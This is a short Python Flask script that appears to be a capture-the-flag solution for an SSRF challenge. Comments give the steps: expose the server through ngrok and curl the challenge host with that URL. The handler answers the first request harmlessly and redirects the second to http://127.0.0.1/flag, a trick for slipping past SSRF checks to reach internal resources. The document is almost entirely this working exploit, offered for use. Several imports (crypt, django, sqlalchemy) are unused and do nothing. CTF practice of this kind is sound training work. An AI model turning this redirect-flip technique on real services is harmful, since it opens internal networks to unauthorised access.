from crypt import methods
from django import http
from flask import Flask, redirect, request
from sqlalchemy import true

#flask run
#ngrok http 5000
#curl -X POST -d "url=https://a5d8-42-113-157-213.ap.ngrok.io/exploit" http://ssrf.chall.seetf.sg:1337/

app = Flask(__name__)
check = true

# @app.route("/")
# def index():
#     return "<a href='https://github.com/'></a>"

@app.route("/exploit", methods=['GET', 'POST'])
def handle():
    global check
    if check: #first request
        check = False
        return "First request is benign, why wouldn't the second be?!"
    else: #second requeste = malicious
        check = True
        return redirect("http://127.0.0.1/flag", code=302)